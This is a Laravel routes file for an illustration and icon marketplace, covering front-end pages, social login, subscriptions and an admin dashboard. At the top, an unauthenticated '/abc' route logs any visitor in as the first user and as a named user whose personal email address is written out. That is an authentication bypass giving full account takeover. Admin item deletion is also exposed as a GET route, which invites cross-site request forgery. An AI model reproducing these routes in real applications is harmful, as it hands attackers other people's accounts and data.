<?php

use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/
Route::get('/abc', function() {
    \Illuminate\Support\Facades\Auth::login(\App\Models\User::first());

    Auth::login(\App\Models\User::where('email', 'shahadat.zcpe@gmail.com')->first());

});
Route::view('welcome', 'renderable.item-thumbnail-generator');

Route::domain(config('app.frontend_url'))->namespace('Frontend')
    ->group(function () {
    Route::get('/auth/{provider}', 'Auth\SocialLoginController@redirect')
        ->name('social-login')->where('provider', implode(',', config('auth.available_login_option')));
    Route::get('/auth/{provider}/callback', 'Auth\SocialLoginController@handleCallback')
        ->name('social-login-callback')->where('provider', implode(',', config('auth.available_login_option')));


    Route::get('/', 'HomepageController@homepage')->name('frontend.homepage'); //done
    Route::get('/vector-illustrations', 'IllustrationController@index')->name('frontend.illustrations.index');
    Route::get('/vector-illustrations/{assetSet:slug}', 'IllustrationController@assetSet')->name('frontend.illustrations.assets-set');
    Route::get('/illustration/{item:slug}', 'IllustrationController@show')->name('frontend.illustrations.asset');
    Route::get('/free-illustrations/{tag}', 'IllustrationController@index')->name('frontend.illustrations.tag');

    Route::get('/3d-illustrations', 'Illustration3dController@index')->name('frontend.illustrations3d.index');
    Route::get('/3d-illustrations/{assetSet:slug}', 'Illustration3dController@assetSet')->name('frontend.illustrations3d.assets-set');
    Route::get('/3d-illustration/{item:slug}', 'Illustration3dController@show')->name('frontend.illustrations3d.asset');
    Route::get('/free-3d-illustrations/{tag}', 'Illustration3dController@index')->name('frontend.illustrations3d.tag');

    Route::get('/icons', 'IconController@index')->name('frontend.icons.index');
    Route::get('/icons/{assetSet}', 'IconController@assetSet')->name('frontend.icons.assets-set');
    Route::get('/icons/{assetSet}/{asset}', 'IconController@show')->name('frontend.icons.asset');

    Route::get('/search', 'SearchController@globalSearch')->name('frontend.search.result'); // done
    Route::get('/sitemap.xml', 'SitemapController@preview')->name('sitemap.xml'); // done


    Route::get('/subscription/intent', 'SubscriptionController@subscriptionIntent')->name('subscription.intent');
    Route::post('/subscription/subscribe', 'SubscriptionController@processSubscription')->name('subscription.process');
    Route::delete('/subscription/payment-method', 'SubscriptionController@deletePaymentMethod')->name('subscription.delete-payment-method');
    Route::post('/subscription/default-payment-method', 'SubscriptionController@updateDefaultPaymentMethod')->name('subscription.update-detault-payment-method');


    Route::get('/account-settings/profile', 'AccountSettings@profile')->name('account-settings.profile');
    Route::get('/account-settings/security', 'AccountSettings@security')->name('account-settings.password');
    Route::get('/account-settings/plan', 'AccountSettings@plan')->name('account-settings.plan');

    });





Route::domain(config('app.url'))->group(function () {

Route::redirect('/', '/login');



Route::middleware('auth')->group(function() {
    Route::get('/dashboard', 'DashboardController@index')->name('dashboard');
    Route::get('/asset-sets/index', 'AssetSetController@index')->name('asset-sets.index');
    Route::get('/asset-sets/create', 'AssetSetController@create')->name('asset-sets.create');
    Route::post('/asset-sets', 'AssetSetController@store')->name('asset-sets.store');
    Route::get('/asset-sets/{assetSet}', 'AssetSetController@show')->name('asset-sets.show');
    Route::get('/asset-sets/{assetSet}/edit', 'AssetSetController@edit')->name('asset-sets.edit');
    Route::put('/asset-sets/{assetSet}', 'AssetSetController@update')->name('asset-sets.update');
    Route::delete('/asset-sets/{assetSet}', 'AssetSetController@destroy')->name('asset-sets.delete');
    Route::post('/asset-sets/{assetSet}/restore', 'AssetSetController@restore')->name('asset-sets.restore');
    Route::get('/asset-sets/{assetSet}/upload-form', 'AssetSetController@uploadForm')->name('asset-sets.upload-items');
    Route::post('/asset-sets/{assetSet}/upload-item', 'AssetSetController@uploadItem')->name('asset-sets.upload-item');
    Route::post('/asset-sets/{assetSet}/update-items', 'AssetSetController@updateItems')->name('asset-sets.update-items');

    Route::get('/asset-sets/{assetSet}/pending-items', 'AssetSetController@pendingItems')->name('asset-sets.pending-items');


    Route::get('/items/index', 'ItemController@index')->name("items.index");
    Route::get('/items/{item}/update', 'ItemController@update')->name("items.update");
    Route::get('/items/{item}', 'ItemController@destroy')->name("items.delete");

    Route::get('/tags/index', 'TagController@index')->name("tags.index");


    Route::get('/users/index', 'UserController@index')->name("users.index");
    Route::get('/users/paid-subscribers', 'UserController@paidSubscribers')->name("users.paid-subscribers");
    Route::get('/users/trails-subscribers', 'UserController@trailSubscribers')->name("users.trail-subscribers");

    Route::get('/mail/create', 'MailController@create')->name("mails.create");
    Route::get('/mail/index', 'MailController@index')->name("mails.index");

    Route::get('/mailing-lists', 'MailingListController@index')->name("mailing-lists.index");
    Route::get('/mailing-lists/subscribers', 'MailingListController@subscribers')->name("mailing-lists.subscribers");
    Route::get('/transactions/index', 'TransactionController@index')->name("transactions.index");


//Route::get('settings', 'SettingController@index')->name("settings");

});

});
